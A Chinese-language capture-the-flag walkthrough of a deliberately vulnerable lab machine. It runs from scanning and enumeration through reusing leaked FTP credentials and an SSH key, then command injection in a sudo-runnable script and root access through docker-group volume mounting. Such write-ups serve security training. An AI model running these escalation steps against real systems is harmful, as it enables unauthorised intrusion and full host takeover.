# 一、信息收集

## 1.1 主机发现

使用 `arp-scan` 扫描局域网内的存活主机，定位目标靶机：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ sudo arp-scan -l
...
192.168.205.237 08:00:27:b9:99:eb       PCS Systemtechnik GmbH
...
```

确定目标 IP 地址为 `192.168.205.237`。

## 1.2 端口扫描

对目标进行全端口扫描，发现开放的服务：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nmap -p0-65535 192.168.205.237
...
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
...
```

**开放端口及服务：**

- 21/tcp: FTP 服务 (vsFTPd 3.0.3)
- 22/tcp: SSH 服务
- 80/tcp: HTTP 服务 (Apache/2.4.38)

## 1.3 FTP 服务探测

尝试使用匿名用户登录 FTP，但被拒绝：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ ftp anonymous@192.168.205.237
...
530 Permission denied.
ftp: Login failed
```

**结论：** FTP 服务不允许匿名访问，需要有效凭证。

---

# 二、Web 应用渗透

## 2.1 首页信息收集

访问 Web 服务，获取首页内容：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl 192.168.205.237 -v
...
<h1>  vanakam nanba (Hello friend) </h1>
...
A last note from Attacker :)
I am Annlynn. I am the hacker hacked your server...
Before finding me investigate your employees first.
...
<!-- I forgot to add this on last note
     You are pretty smart as i thought 
     so here i left it for you 
     She sings very well. l loved it  -->
```

**关键信息：**

- 攻击者自称 Annlynn
- HTML 注释中提到 "She sings very well"，可能暗示用户名线索

## 2.2 目录枚举

### 2.2.1 初步扫描

使用 `dirsearch` 进行目录扫描：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ dirsearch -q -u 192.168.205.237
...
[19:53:27] 200 -   41B  - http://192.168.205.237/robots.txt
...
```

### 2.2.2 robots.txt 分析

查看 `robots.txt` 文件内容：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl http://192.168.205.237/robots.txt
# Group 1
User-agent: *
Allow: /nothing
```

访问 `/nothing` 目录：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl http://192.168.205.237/nothing/
...
<tr><td valign="top"><img src="/icons/text.gif" alt="[TXT]"></td><td><a href="nothing.html">nothing.html</a></td>...
```

查看 `nothing.html`：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl http://192.168.205.237/nothing/nothing.html
<h1>i said nothing bro </h1>
<!--I said nothing here. you are wasting your time i don't lie-->
```

**结论：** 这是个干扰路径，无有效信息。

### 2.2.3 深度目录扫描

使用 `gobuster` 配合大字典进行深度扫描：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ gobuster dir -u 192.168.205.237 -k -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html,zip,db,bak -t 64
...
/hidden_text          (Status: 301) [Size: 324] [--> http://192.168.205.237/hidden_text/]
...
```

### 2.2.4 发现隐藏字典

访问 `/hidden_text` 目录，发现 `secret.dic` 文件：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl http://192.168.205.237/hidden_text/secret.dic
/hacked
/vanakam_nanba
/hackerman.gif 
/pwned
/hacked.vuln
/users.vuln
/passwd.vuln
/pwned.vuln
/backup.vuln
/.ssh
/root
/home
...
```

**知识点：** 自定义字典文件常用于引导渗透测试方向，应将其下载作为后续扫描的字典。

## 2.3 基于自定义字典的扫描

下载字典文件并使用 `gobuster` 进行定向扫描：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ curl http://192.168.205.237/hidden_text/secret.dic -O

┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ gobuster dir -u 192.168.205.237 -k -w secret.dic -x php,txt,html,zip,db,bak -t 64
...
/pwned.vuln           (Status: 301) [Size: 323] [--> http://192.168.205.237/pwned.vuln/]
...
```

## 2.4 发现登录页面及凭证

访问 `/pwned.vuln` 目录，发现登录页面及注释中的凭证：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ curl http://192.168.205.237/pwned.vuln/ | sed '/<style>/,/<\/style>/d'
...
<h1> vanakam nanba. I hacked your login page too with advanced hacking method</h1>
...
<?php
//      if (isset($_POST['submit'])) {
//              $un=$_POST['username'];
//              $pw=$_POST['password'];
//
//      if ($un=='ftpuser' && $pw=='B0ss_B!TcH') {
//              echo "welcome"
//              exit();
// }
...
?>
```

**获取凭证：**

- 用户名：`ftpuser`
- 密码：`B0ss_B!TcH`

**知识点：** 开发人员有时会在源代码注释中留下测试凭证或敏感信息，应仔细检查 HTML、JavaScript 源码。

---

# 三、FTP 服务利用

## 3.1 登录 FTP

使用获取的凭证登录 FTP 服务：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ ftp ftpuser@192.168.205.237
...
230 Login successful.
ftp> ls
drwxr-xr-x    2 0        0            4096 Jul 10  2020 share
```

## 3.2 下载敏感文件

进入 `share` 目录，发现 SSH 私钥和提示文本：

```bash
ftp> cd share
ftp> ls
-rw-r--r--    1 0        0            2602 Jul 09  2020 id_rsa
-rw-r--r--    1 0        0              75 Jul 09  2020 note.txt

ftp> mget *
mget id_rsa [anpqy?]? y
...
mget note.txt [anpqy?]? y
...
```

查看提示文本：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ cat note.txt
Wow you are here 
ariana won't happy about this note 
sorry ariana :( 
```

**关键信息：** 用户名可能是 `ariana`。

---

# 四、SSH 登录与横向移动

## 4.1 SSH 私钥登录

配置私钥权限并尝试登录：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ cp id_rsa /tmp/id_rsa
└─$ chmod 600 /tmp/id_rsa

└─$ ssh root@192.168.205.237 -i /tmp/id_rsa
root@192.168.205.237's password:    # 需要密码，失败

└─$ ssh ariana@192.168.205.237 -i /tmp/id_rsa
...
ariana@pwned:~$ id
uid=1000(ariana) gid=1000(ariana) groups=1000(ariana),...
```

## 4.2 权限提升探测

检查 sudo 权限：

```bash
ariana@pwned:~$ sudo -l
User ariana may run the following commands on pwned:
    (selena) NOPASSWD: /home/messenger.sh
```

**发现：** ariana 可以以 selena 用户身份无密码执行 `/home/messenger.sh` 脚本。

## 4.3 脚本分析与利用

查看脚本内容：

```bash
ariana@pwned:~$ cat /home/messenger.sh
#!/bin/bash
...
read -p "Enter username to send message : " name 
read -p "Enter message for $name :" msg
echo "Sending message to $name "
$msg 2> /dev/null
...
```

**漏洞分析：** 脚本直接执行用户输入的 `$msg` 变量，存在命令注入漏洞。

**利用过程：**

```bash
ariana@pwned:~$ sudo -u selena /home/messenger.sh
...
Enter username to send message : /bin/bash
Enter message for /bin/bash :/bin/bash
...
id
uid=1001(selena) gid=1001(selena) groups=1001(selena),115(docker)
```

**知识点：** 当脚本不当处理用户输入并直接执行时，可通过输入 `/bin/bash` 或 `/bin/sh` 等命令获取 shell。

## 4.4 稳定 Shell

获取稳定的交互式 Shell：

```bash
script /dev/null -c bash
Script started, file is /dev/null
selena@pwned:/home/ariana$ id
uid=1001(selena) gid=1001(selena) groups=1001(selena),115(docker)
```

---

# 五、Docker 逃逸提权

## 5.1 发现 Docker 组权限

检查当前用户组：

```bash
selena@pwned:/home/ariana$ id
uid=1001(selena) gid=1001(selena) groups=1001(selena),115(docker)
```

**关键发现：** selena 用户属于 `docker` 组。

**知识点：** Docker 组成员可以无需 root 权限运行容器，通过挂载宿主机文件系统可实现权限提升。

## 5.2 列出 Docker 镜像

查看可用的 Docker 镜像：

```bash
selena@pwned:/home/ariana$ docker images
REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
privesc             latest              09ae39f0f8fc        5 years ago         88.3MB
alpine              latest              a24bb4013296        5 years ago         5.57MB
debian              wheezy              10fcec6d95c4        6 years ago         88.3MB
```

## 5.3 利用 Docker 提权至 Root

使用 `alpine` 镜像挂载宿主机根目录：

```bash
selena@pwned:/home/ariana$ docker run -v /:/mnt --rm -it alpine chroot /mnt bash
root@a0d013691f32:/# id
uid=0(root) gid=0(root) groups=0(root),...
```

**命令解析：**

- `-v /:/mnt`：将宿主机根目录挂载到容器的 `/mnt` 目录

  - `--rm`：容器退出后自动删除
  - `-it`：交互式终端
  - `chroot /mnt bash`：切换根目录到 `/mnt` 并执行 bash

  **知识点：** Docker 容器内的 root 用户可以访问挂载的宿主机文件系统，通过 `chroot` 切换到宿主机根目录，实现完全的系统控制权限。这是 Docker 组成员提权到 root 的经典方法。

  ## 5.4 获取 Flag

  读取 root 和 selena 用户的 flag：

  ```bash
  root@a0d013691f32:/# cat /root/root.txt
  4d4098d64e163d2726959455d046fd7c
  
  root@a0d013691f32:/# cat /home/selena/user2.txt
  711fdfc6caad532815a440f7f295c176
  
  You are near to me. you found selena too.
  Try harder to catch me
  ```